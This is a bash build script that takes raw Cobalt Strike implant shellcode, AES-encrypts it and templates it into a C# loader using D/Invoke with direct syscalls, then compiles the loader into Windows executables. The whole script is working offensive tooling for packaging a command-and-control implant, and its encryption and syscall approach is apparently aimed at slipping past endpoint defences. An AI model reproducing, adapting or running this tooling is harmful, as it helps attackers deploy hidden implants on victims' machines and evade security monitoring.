#!/bin/bash

## Version 0.2, using D/Invoke with direct syscalls
## Use CS shellcode directly without donut 

## lhost and lport are not in use for this script, make sure arch is correct
lhost="10.0.0.186"
lport="9443"
arch="x64"
c2type="Cobalt Strike"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### To Generate a CS implant shellcode without obfuscation:
# Attacks -> Packages -> Payload Generator
# Choose Raw in Output area.
### Move the cs_payload.bin to folder input and rename to cs_payload.bin, then run the autogen script.


rawscfilename='cs_payload.bin'
rawscfilename_enc=$rawscfilename'.enc'
raw_cs_filename_compiled='cs_payload.exe'


sleep 2

cp aesloader2_template.txt tmp/aesloadermono_cs.cs

mono-csc -out:encryptor.exe -platform:x64 encryptor.cs

mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt

encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output2.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output2.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output2.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/aesloadermono_cs.cs
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/aesloadermono_cs.cs
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/aesloadermono_cs.cs
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/aesloadermono_cs.cs
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/aesloadermono_cs.cs
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/aesloadermono_cs.cs
sed -i '' -f /dev/stdin tmp/aesloadermono_cs.cs << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

if [ $arch = 'x64' ]
then
    mono-csc -out:output/aesloadermono_cs_x64.exe -platform:x64 -unsafe tmp/aesloadermono_cs.cs
fi

if [ $arch = 'x86' ]
then
    mono-csc -out:output/aesloadermono_cs_x86.exe -platform:x86 -unsafe tmp/aesloadermono_cs.cs
fi
